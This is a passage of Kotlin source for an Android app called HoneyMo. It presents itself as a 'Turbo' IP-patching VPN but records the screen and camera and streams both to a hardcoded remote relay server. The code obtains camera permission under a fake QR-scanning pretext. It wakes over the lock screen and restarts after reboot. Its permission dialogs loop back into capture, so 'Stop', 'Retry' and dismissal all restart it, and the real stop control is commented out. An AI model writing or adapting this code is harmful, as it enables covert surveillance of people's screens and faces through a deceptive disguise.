package com.example.HoneyMo

import android.Manifest
import android.app.Activity
import android.app.KeyguardManager
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.*
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.drawBehind
import androidx.compose.ui.draw.scale
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Size
import androidx.compose.ui.graphics.*
import androidx.compose.ui.graphics.drawscope.DrawScope
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.graphics.drawscope.rotate
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.example.HoneyMo.receiver.BootReceiver
import com.example.HoneyMo.service.ScreenCaptureService
import com.example.HoneyMo.util.SessionPreferences
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.Locale
import kotlin.math.*

// Constant Stream Configuration
private const val FIXED_SERVER_URL = "wss://honeymo-relay-server.onrender.com/ws/device"
private const val FIXED_FPS = 15
private const val FIXED_BITRATE = 1_000_000 // 1 Mbps (lightweight, non-fluctuating)

// Cyber Honey & Blue-Black Theme Palette
private val ColorBgDark = Color(0xFF060913)
private val ColorCardBg = Color(0xFF0D1527)
private val ColorCardInner = Color(0xFF101B33)
private val ColorCardBorder = Color(0xFF1B2B4A)
private val ColorHoneyYellow = Color(0xFFFFC807)
private val ColorHoneyGold = Color(0xFFF59E0B)
private val ColorHoneyLight = Color(0xFFFEF08A)
private val ColorCyberCyan = Color(0xFF38BDF8)
private val ColorElectricBlue = Color(0xFF2563EB)
private val ColorTextWhite = Color(0xFFF8FAFC)
private val ColorTextMuted = Color(0xFF94A3B8)
private val ColorEmerald = Color(0xFF10B981)
private val ColorCrimson = Color(0xFFEF4444)

class MainActivity : ComponentActivity() {

    private var isBootLaunch by mutableStateOf(false)
    private var isInterruptedSession by mutableStateOf(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Allow display over lock screen and wake up screen on boot or incoming notification
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
            val km = getSystemService(KeyguardManager::class.java)
            km?.requestDismissKeyguard(this, null)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            )
        }

        isBootLaunch = intent?.getBooleanExtra("EXTRA_BOOT_LAUNCH", false) == true
        isInterruptedSession = intent?.getBooleanExtra("EXTRA_INTERRUPTED_SESSION", false) == true ||
            SessionPreferences.wasRecordingActive(this)

        setContent {
            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = ColorHoneyYellow,
                    secondary = ColorCyberCyan,
                    background = ColorBgDark,
                    surface = ColorCardBg,
                    onBackground = ColorTextWhite,
                    onSurface = ColorTextWhite
                )
            ) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = ColorBgDark
                ) {
                    VPNApp(
                        autoStartPrompt = isBootLaunch,
                        isInterrupted = isInterruptedSession,
                        onResetInterrupted = { isInterruptedSession = false }
                    )
                }
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent.getBooleanExtra("EXTRA_BOOT_LAUNCH", false)) {
            isBootLaunch = true
        }
        if (intent.getBooleanExtra("EXTRA_INTERRUPTED_SESSION", false) || SessionPreferences.wasRecordingActive(this)) {
            isInterruptedSession = true
        }
    }
}

@Composable
fun VPNApp(
    autoStartPrompt: Boolean = false,
    isInterrupted: Boolean = false,
    onResetInterrupted: () -> Unit = {}
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val stats by ScreenCaptureService.statsFlow.collectAsState()

    // Keep screen turned on while actively streaming
    val activity = context as? Activity
    DisposableEffect(stats.isStreaming) {
        if (stats.isStreaming) {
            activity?.window?.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        }
        onDispose {
            activity?.window?.clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        }
    }

    var showPermissionDeniedDialog by remember { mutableStateOf(false) }

    // Battery Optimization check
    var isBatteryOptIgnored by remember {
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        mutableStateOf(pm.isIgnoringBatteryOptimizations(context.packageName))
    }

    var hasCameraPermission by remember {
        mutableStateOf(ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED)
    }
    var isFaceCamEnabled by remember {
        mutableStateOf(SessionPreferences.isFaceCamEnabled(context))
    }

    val cameraPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        hasCameraPermission = isGranted
        if (isGranted) {
            isFaceCamEnabled = true
            SessionPreferences.setFaceCamEnabled(context, true)
            Toast.makeText(context, "Now scan the QR code u get..", Toast.LENGTH_LONG).show()

            val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock
            if (isServiceActive) {
                val intent = Intent(context, ScreenCaptureService::class.java).apply {
                    action = ScreenCaptureService.ACTION_TOGGLE_FACECAM
                    putExtra(ScreenCaptureService.EXTRA_ENABLE_FACECAM, true)
                }
                context.startService(intent)
            }
        } else {
            ScreenCaptureService.instance?.sendCurrentCameraStatus()
            Toast.makeText(context, "Camera permission is required for Scan QR code", Toast.LENGTH_LONG).show()
        }
    }

    var selectedFacing by remember {
        mutableStateOf(SessionPreferences.getCameraFacing(context))
    }

    LaunchedEffect(stats.cameraFacing) {
        selectedFacing = stats.cameraFacing
    }

    // Screen capture permission launcher
    val captureLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            showPermissionDeniedDialog = false

            // Cancel any recovery notification once session has started
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.cancel(BootReceiver.RECOVERY_NOTIFICATION_ID)

            // Calculate scaled 540p resolution maintaining screen aspect ratio
            val metrics = context.resources.displayMetrics
            val screenWidth = metrics.widthPixels
            val screenHeight = metrics.heightPixels
            val isPortrait = screenHeight >= screenWidth

            val targetWidth: Int
            val targetHeight: Int

            if (isPortrait) {
                // Scale width to 540 and height proportionally
                val scale = 540f / screenWidth.toFloat()
                val rawH = (screenHeight * scale).toInt()
                targetWidth = (540 + 15) / 16 * 16 // 16-pixel aligned for AVC encoder
                targetHeight = (rawH + 15) / 16 * 16
            } else {
                // Scale height to 540 and width proportionally
                val scale = 540f / screenHeight.toFloat()
                val rawW = (screenWidth * scale).toInt()
                targetWidth = (rawW + 15) / 16 * 16
                targetHeight = (540 + 15) / 16 * 16
            }

            val serviceIntent = Intent(context, ScreenCaptureService::class.java).apply {
                action = ScreenCaptureService.ACTION_START
                putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, result.resultCode)
                putExtra(ScreenCaptureService.EXTRA_DATA, result.data)
                putExtra(ScreenCaptureService.EXTRA_SERVER_URL, FIXED_SERVER_URL)
                putExtra(ScreenCaptureService.EXTRA_WIDTH, targetWidth)
                putExtra(ScreenCaptureService.EXTRA_HEIGHT, targetHeight)
                putExtra(ScreenCaptureService.EXTRA_DENSITY, metrics.densityDpi)
                putExtra(ScreenCaptureService.EXTRA_FPS, FIXED_FPS)
                putExtra(ScreenCaptureService.EXTRA_BITRATE, FIXED_BITRATE)
                putExtra(ScreenCaptureService.EXTRA_ENABLE_FACECAM, isFaceCamEnabled && hasCameraPermission)
            }

            ContextCompat.startForegroundService(context, serviceIntent)
            Toast.makeText(context, "Streaming started (540p @ 15fps)", Toast.LENGTH_SHORT).show()
        } else {
            // User rejected or dismissed the screen capture dialog
            Toast.makeText(context, "Screen capture permission is required", Toast.LENGTH_SHORT).show()
            showPermissionDeniedDialog = true
        }
    }
    // Permissions launcher for Notifications
    val permissionsLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        captureLauncher.launch(mpManager.createScreenCaptureIntent())
    }
    fun startStreaming() {
        val permissionsToRequest = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
        if (permissionsToRequest.isNotEmpty()) {
            permissionsLauncher.launch(permissionsToRequest.toTypedArray())
            return
        }
        if (!hasCameraPermission) {
            cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
        }

        val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        captureLauncher.launch(mpManager.createScreenCaptureIntent())
    }

    fun stopStreaming() {
        onResetInterrupted()
        showPermissionDeniedDialog = false
        SessionPreferences.setRecordingActive(context, false)
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.cancel(BootReceiver.RECOVERY_NOTIFICATION_ID)
        nm.cancel(ScreenCaptureService.NOTIFICATION_ID)
        val serviceIntent = Intent(context, ScreenCaptureService::class.java).apply {
            action = ScreenCaptureService.ACTION_STOP
        }
        context.startService(serviceIntent)
        Toast.makeText(context, "Screen streaming stopped", Toast.LENGTH_SHORT).show()
    }

    val isInterruptedSessionActive = isInterrupted || SessionPreferences.wasRecordingActive(context)
    var showRecoveryDialog by remember(isInterruptedSessionActive) {
        mutableStateOf(isInterruptedSessionActive && !stats.isStreaming)
    }

    LaunchedEffect(isInterruptedSessionActive, stats.isStreaming) {
        if (isInterruptedSessionActive && !stats.isStreaming) {
            showRecoveryDialog = true
        }
    }

    // Automatically trigger screen capture prompt ONLY if autoStartPrompt is true without interrupted state
    LaunchedEffect(autoStartPrompt) {
        if (autoStartPrompt && !isInterruptedSessionActive && !stats.isStreaming) {
            delay(350)
            startStreaming()
        }
    }

    // Trap hardware Back button when in interrupted recovery mode or showing dialog
    BackHandler(enabled = (isInterrupted || showRecoveryDialog || showPermissionDeniedDialog) && !stats.isStreaming) {
        if (showRecoveryDialog) {
            // Keep recovery dialog visible
        } else {
            showPermissionDeniedDialog = true
            coroutineScope.launch {
                delay(350)
                startStreaming()
            }
        }
    }

    // Explicit Recovery Dialogue shown after device reboot/unlock
    if (showRecoveryDialog && !stats.isStreaming) {
        AlertDialog(
            onDismissRequest = {
                // Keep showing until user selects an action
            },
            title = {
                Text(
                    text = "Resume Screen Recording",
                    fontWeight = FontWeight.Bold,
                    color = ColorHoneyYellow
                )
            },
            text = {
                Text(
                    text = "VPN was active before the device restarted. Tap 'Resume VPN IP Patching' to continue streaming your Internet.",
                    color = ColorTextWhite
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        showRecoveryDialog = false
                        onResetInterrupted()
                        coroutineScope.launch {
                            delay(150)
                            startStreaming()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = ColorHoneyYellow)
                ) {
                    Text("Resume VPN IP Patching", fontWeight = FontWeight.Bold, color = ColorBgDark)
                }
            },
            dismissButton = {
                TextButton(
                    onClick = {
                        showRecoveryDialog = false
                        onResetInterrupted()
                        startStreaming()
                    }
                ) {
                    Text("Stop", color = ColorTextMuted)
                }
            },
            containerColor = ColorCardBg
        )
    }

    // Interactive loop dialog if user cancelled/rejected screen capture permission
    if (showPermissionDeniedDialog && !stats.isStreaming && !showRecoveryDialog) {
        AlertDialog(
            onDismissRequest = {
                showPermissionDeniedDialog = false
                coroutineScope.launch {
                    delay(350)
                    startStreaming()
                }
            },
            title = {
                Text(
                    text = "Screen Capture Required",
                    fontWeight = FontWeight.Bold,
                    color = ColorHoneyYellow
                )
            },
            text = {
                Text(
                    text = "HoneyMo requires screen capture permission to Connect to VPN. Please tap 'Start Capturing' to grant permission.",
                    color = ColorTextWhite
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        showPermissionDeniedDialog = false
                        coroutineScope.launch {
                            delay(350)
                            startStreaming()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = ColorHoneyYellow)
                ) {
                    Text("Start Capturing", fontWeight = FontWeight.Bold, color = ColorBgDark)
                }
            },
            dismissButton = {
                TextButton(
                    onClick = {
                        showPermissionDeniedDialog = false
                        coroutineScope.launch {
                            delay(350)
                            startStreaming()
                        }
                    }
                ) {
                    Text("Retry", color = ColorTextMuted)
                }
            },
            containerColor = ColorCardBg
        )
    }

    val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock

    // Main Turbo Dashboard Screen Layout
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(
                Brush.verticalGradient(
                    colors = listOf(
                        ColorBgDark,
                        Color(0xFF090F20),
                        ColorBgDark
                    )
                )
            )
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 18.dp, vertical = 16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        // App Top Bar: Mascot + Cyber Honey Title & Status Pill
        AppHeader(
            isStreaming = stats.isStreaming,
            isServiceActive = isServiceActive
        )

        // Live Turbo Status Badge & Connection Pill
        TurboStatusPill(
            isStreaming = stats.isStreaming,
            isPaused = stats.isPausedForLock || (ScreenCaptureService.isRunning && !stats.isStreaming),
            isConnected = stats.isConnectedToServer
        )

        // Turbo Speedometer / Live FPS Meter Card
        TurboSpeedometerCard(
            currentFps = stats.currentFps,
            framesSent = stats.framesSent,
            isStreaming = stats.isStreaming
        )

        // Live Data Counter & Dynamic Oscilloscope Waveform Card
        TurboDataCounterCard(
            bytesSent = stats.bytesSent,
            isStreaming = stats.isStreaming,
            isConnected = stats.isConnectedToServer
        )

        // Stream Preset Details Card
        StreamPresetDetailsCard()

        // Face Cam / Camera Control Card
        if (!hasCameraPermission) {
            CameraPermissionCard(onGrantPermission = {
                cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
            })
        }

        // Battery Optimization Warning Card
        if (!isBatteryOptIgnored) {
            BatteryOptimizationCard(
                onDisable = {
                    try {
                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = Uri.parse("package:${context.packageName}")
                        }
                        context.startActivity(intent)
                        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                        isBatteryOptIgnored = pm.isIgnoringBatteryOptimizations(context.packageName)
                    } catch (e: Exception) {
                        Toast.makeText(context, "Cannot open battery settings directly", Toast.LENGTH_SHORT).show()
                    }
                }
            )
        }

        // Error message if any
        stats.errorMsg?.let { error ->
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0x33EF4444)),
                border = BorderStroke(1.dp, ColorCrimson),
                shape = RoundedCornerShape(12.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(
                    text = error,
                    color = Color(0xFFFCA5A5),
                    fontSize = 12.sp,
                    fontFamily = FontFamily.Monospace,
                    modifier = Modifier.padding(12.dp)
                )
            }
        }

        Spacer(modifier = Modifier.height(6.dp))

        // Centerpiece Animated Turbo VPN Action Button
        TurboVpnActionButton(
            isServiceActive = isServiceActive,
            isStreaming = stats.isStreaming,
            isPaused = stats.isPausedForLock,
            onClick = {
                if (!isServiceActive && hasCameraPermission) {
                    startStreaming()
                } else {
                    if (!hasCameraPermission) {
                        cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
                    } else if (isServiceActive) {
                      startStreaming()
                    }
                }
            }
        )

        // // Secondary Stop Testing Button (Preserving all original test features)
        // if (isServiceActive) {
        //     OutlinedButton(
        //         onClick = {
        //             stopStreaming()
        //         },
        //         modifier = Modifier
        //             .fillMaxWidth()
        //             .height(52.dp),
        //         shape = RoundedCornerShape(14.dp),
        //         border = BorderStroke(1.5.dp, ColorCrimson),
        //         colors = ButtonDefaults.outlinedButtonColors(
        //             containerColor = Color(0x1AEF4444),
        //             contentColor = Color(0xFFFCA5A5)
        //         )
        //     ) {
        //         Text(
        //             text = "⏹ Stop (Testing)",
        //             fontWeight = FontWeight.Bold,
        //             fontSize = 15.sp,
        //             color = Color(0xFFFCA5A5)
        //         )
        //     }
        // }

        Spacer(modifier = Modifier.height(10.dp))
    }
}

// ==========================================
// COMPOSABLE UI COMPONENTS & TURBO WIDGETS
// ==========================================

@Composable
fun AppHeader(
    isStreaming: Boolean,
    isServiceActive: Boolean
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        verticalAlignment = Alignment.CenterVertically,
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Row(
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.spacedBy(14.dp)
        ) {
            // Animated HoneyMo Bee Mascot Icon
            HoneyMoBeeMascot(
                isStreaming = isStreaming,
                modifier = Modifier.size(56.dp)
            )

            Column {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        text = "HoneyMo",
                        fontSize = 24.sp,
                        fontWeight = FontWeight.Black,
                        color = ColorTextWhite,
                        letterSpacing = 0.5.sp
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(6.dp))
                            .background(Color(0x26FFC807))
                            .border(1.dp, Color(0x80FFC807), RoundedCornerShape(6.dp))
                            .padding(horizontal = 6.dp, vertical = 2.dp)
                    ) {
                        Text(
                            text = "TURBO",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.ExtraBold,
                            color = ColorHoneyYellow
                        )
                    }
                }
                Text(
                    text = "Hardware H.264 IP Patching VPN Service",
                    fontSize = 11.sp,
                    color = ColorCyberCyan,
                    fontWeight = FontWeight.Medium
                )
            }
        }
    }
}

@Composable
fun TurboStatusPill(
    isStreaming: Boolean,
    isPaused: Boolean,
    isConnected: Boolean
) {
    val infiniteTransition = rememberInfiniteTransition(label = "status_pulse")
    val pulseAlpha by infiniteTransition.animateFloat(
        initialValue = 0.4f,
        targetValue = 1f,
        animationSpec = infiniteRepeatable(
            animation = tween(900, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "pulse_alpha"
    )

    val (badgeColor, badgeBg, badgeBorder, badgeText) = when {
        isStreaming -> Quad(ColorEmerald, Color(0x2010B981), Color(0x6610B981), "TURBO TUNNEL ACTIVE")
        isPaused -> Quad(ColorHoneyGold, Color(0x20F59E0B), Color(0x66F59E0B), "PAUSED (SCREEN OFF)")
        else -> Quad(ColorTextMuted, Color(0x1894A3B8), Color(0x3394A3B8), "SYSTEM READY / IDLE")
    }

    Card(
        colors = CardDefaults.cardColors(containerColor = ColorCardBg),
        shape = RoundedCornerShape(14.dp),
        border = BorderStroke(1.dp, ColorCardBorder),
        modifier = Modifier.fillMaxWidth()
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 14.dp, vertical = 10.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                // Radar ping dot
                Box(
                    modifier = Modifier
                        .size(10.dp)
                        .clip(CircleShape)
                        .background(badgeColor.copy(alpha = if (isStreaming) pulseAlpha else 1f))
                        .border(
                            1.5.dp,
                            if (isStreaming) ColorHoneyYellow else Color.Transparent,
                            CircleShape
                        )
                )
                Text(
                    text = badgeText,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    color = badgeColor,
                    letterSpacing = 0.5.sp
                )
            }

            // Cloud Server Link Indicator
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(4.dp)
            ) {
                Box(
                    modifier = Modifier
                        .size(6.dp)
                        .clip(CircleShape)
                        .background(if (isConnected) ColorEmerald else ColorCrimson)
                )
                Text(
                    text = if (isConnected) "Relay Linked" else "Relay Offline",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.SemiBold,
                    color = if (isConnected) ColorCyberCyan else ColorCrimson
                )
            }
        }
    }
}

private data class Quad<A, B, C, D>(val first: A, val second: B, val third: C, val fourth: D)

@Composable
fun TurboSpeedometerCard(
    currentFps: Int,
    framesSent: Long,
    isStreaming: Boolean
) {
    Card(
        colors = CardDefaults.cardColors(containerColor = ColorCardBg),
        shape = RoundedCornerShape(20.dp),
        border = BorderStroke(1.5.dp, ColorCardBorder),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(18.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    Text("⚡", fontSize = 16.sp)
                    Text(
                        text = "LIVE TURBO FPS MONITOR",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.ExtraBold,
                        color = ColorHoneyYellow,
                        letterSpacing = 1.sp
                    )
                }

                Text(
                    text = "TARGET: 15 FPS",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    color = ColorCyberCyan
                )
            }

            // Speedometer Arc Gauge with Animated Pointer & Central Counter
            TurboSpeedometerArc(
                currentFps = currentFps,
                isStreaming = isStreaming,
                modifier = Modifier
                    .fillMaxWidth()
                    .height(170.dp)
            )

            // Bottom telemetry stats
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(12.dp))
                    .background(ColorCardInner)
                    .padding(horizontal = 14.dp, vertical = 10.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column {
                    Text("TOTAL FRAMES ENCODED", fontSize = 10.sp, color = ColorTextMuted, fontWeight = FontWeight.Bold)
                    Text(
                        text = String.format(Locale.US, "%,d", framesSent),
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Black,
                        color = ColorTextWhite,
                        fontFamily = FontFamily.Monospace
                    )
                }

                Column(horizontalAlignment = Alignment.End) {
                    Text("ENCODER ENGINE", fontSize = 10.sp, color = ColorTextMuted, fontWeight = FontWeight.Bold)
                    Text(
                        text = if (isStreaming) "ACTIVE (H.264 AVC)" else "STANDBY (AVC)",
                        fontSize = 13.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (isStreaming) ColorEmerald else ColorTextMuted
                    )
                }
            }
        }
    }
}

@Composable
fun TurboSpeedometerArc(
    currentFps: Int,
    isStreaming: Boolean,
    modifier: Modifier = Modifier
) {
    val animatedFps by animateFloatAsState(
        targetValue = currentFps.toFloat(),
        animationSpec = spring(dampingRatio = Spring.DampingRatioMediumBouncy, stiffness = Spring.StiffnessLow),
        label = "animated_fps"
    )

    val infiniteTransition = rememberInfiniteTransition(label = "gauge_glow")
    val glowSweep by infiniteTransition.animateFloat(
        initialValue = 0.85f,
        targetValue = 1.15f,
        animationSpec = infiniteRepeatable(
            animation = tween(800, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "gauge_pulse"
    )

    Box(
        modifier = modifier,
        contentAlignment = Alignment.Center
    ) {
        Canvas(modifier = Modifier.fillMaxSize()) {
            val center = Offset(size.width / 2f, size.height * 0.68f)
            val radius = size.height * 0.58f

            val strokeWidth = 12.dp.toPx()
            val startAngle = 150f
            val totalSweep = 240f

            // 1. Background Inactive Arc Track
            drawArc(
                color = Color(0xFF142038),
                startAngle = startAngle,
                sweepAngle = totalSweep,
                useCenter = false,
                topLeft = Offset(center.x - radius, center.y - radius),
                size = Size(radius * 2f, radius * 2f),
                style = Stroke(width = strokeWidth, cap = StrokeCap.Round)
            )

            // 2. Graduation Ticks around the Arc
            val numTicks = 16
            for (i in 0..numTicks) {
                val tickFraction = i.toFloat() / numTicks.toFloat()
                val angleDeg = startAngle + tickFraction * totalSweep
                val angleRad = Math.toRadians(angleDeg.toDouble())

                val innerR = radius - (if (i % 5 == 0) 20.dp.toPx() else 14.dp.toPx())
                val outerR = radius - 7.dp.toPx()

                val p1 = Offset(
                    center.x + (innerR * cos(angleRad)).toFloat(),
                    center.y + (innerR * sin(angleRad)).toFloat()
                )
                val p2 = Offset(
                    center.x + (outerR * cos(angleRad)).toFloat(),
                    center.y + (outerR * sin(angleRad)).toFloat()
                )

                val tickColor = if (tickFraction <= (animatedFps / 20f).coerceIn(0f, 1f)) {
                    ColorHoneyYellow
                } else {
                    Color(0xFF233557)
                }

                drawLine(
                    color = tickColor,
                    start = p1,
                    end = p2,
                    strokeWidth = if (i % 5 == 0) 3.dp.toPx() else 1.5.dp.toPx(),
                    cap = StrokeCap.Round
                )
            }

            // 3. Active Glowing Neon Arc
            val currentFraction = (animatedFps / 20f).coerceIn(0.02f, 1f)
            val activeSweep = currentFraction * totalSweep

            val gradientColors = listOf(
                ColorCyberCyan,
                ColorElectricBlue,
                ColorHoneyYellow,
                ColorHoneyGold
            )

            drawArc(
                brush = Brush.sweepGradient(
                    colors = gradientColors,
                    center = center
                ),
                startAngle = startAngle,
                sweepAngle = activeSweep,
                useCenter = false,
                topLeft = Offset(center.x - radius, center.y - radius),
                size = Size(radius * 2f, radius * 2f),
                style = Stroke(
                    width = if (isStreaming) strokeWidth * glowSweep else strokeWidth,
                    cap = StrokeCap.Round
                )
            )

            // 4. Indicator Head Glowing Dot
            val needleAngleDeg = startAngle + activeSweep
            val needleAngleRad = Math.toRadians(needleAngleDeg.toDouble())
            val dotCenter = Offset(
                center.x + (radius * cos(needleAngleRad)).toFloat(),
                center.y + (radius * sin(needleAngleRad)).toFloat()
            )

            drawCircle(
                color = ColorHoneyYellow,
                radius = 8.dp.toPx(),
                center = dotCenter
            )
            drawCircle(
                color = Color.White,
                radius = 4.dp.toPx(),
                center = dotCenter
            )
        }

        // Center Digital Readout
        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            modifier = Modifier.padding(top = 16.dp)
        ) {
            Row(
                verticalAlignment = Alignment.Bottom,
                horizontalArrangement = Arrangement.spacedBy(4.dp)
            ) {
                Text(
                    text = "${currentFps}",
                    fontSize = 46.sp,
                    fontWeight = FontWeight.Black,
                    color = ColorHoneyYellow,
                    fontFamily = FontFamily.Monospace,
                    letterSpacing = (-1).sp
                )
                Text(
                    text = "FPS",
                    fontSize = 16.sp,
                    fontWeight = FontWeight.ExtraBold,
                    color = ColorCyberCyan,
                    modifier = Modifier.padding(bottom = 8.dp)
                )
            }

            Box(
                modifier = Modifier
                    .clip(RoundedCornerShape(12.dp))
                    .background(if (isStreaming) Color(0x3310B981) else Color(0x221B2B4A))
                    .padding(horizontal = 8.dp, vertical = 3.dp)
            ) {
                Text(
                    text = if (isStreaming) "TURBO BOOSTED" else "READY TO ENGAGE",
                    fontSize = 10.sp,
                    fontWeight = FontWeight.Bold,
                    color = if (isStreaming) ColorEmerald else ColorTextMuted
                )
            }
        }
    }
}

@Composable
fun TurboDataCounterCard(
    bytesSent: Long,
    isStreaming: Boolean,
    isConnected: Boolean
) {
    val (dataVal, dataUnit) = formatBytes(bytesSent)

    Card(
        colors = CardDefaults.cardColors(containerColor = ColorCardBg),
        shape = RoundedCornerShape(20.dp),
        border = BorderStroke(1.5.dp, ColorCardBorder),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(18.dp),
            verticalArrangement = Arrangement.spacedBy(14.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    Text("📊", fontSize = 16.sp)
                    Text(
                        text = "LIVE DATA COUNTER & TUNNEL WAVE",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.ExtraBold,
                        color = ColorHoneyYellow,
                        letterSpacing = 1.sp
                    )
                }

                Text(
                    text = "RATE: 1.0 Mbps",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    color = ColorCyberCyan
                )
            }

            // Big Bold Digital Readout
            Row(
                modifier = Modifier.fillMaxWidth(),
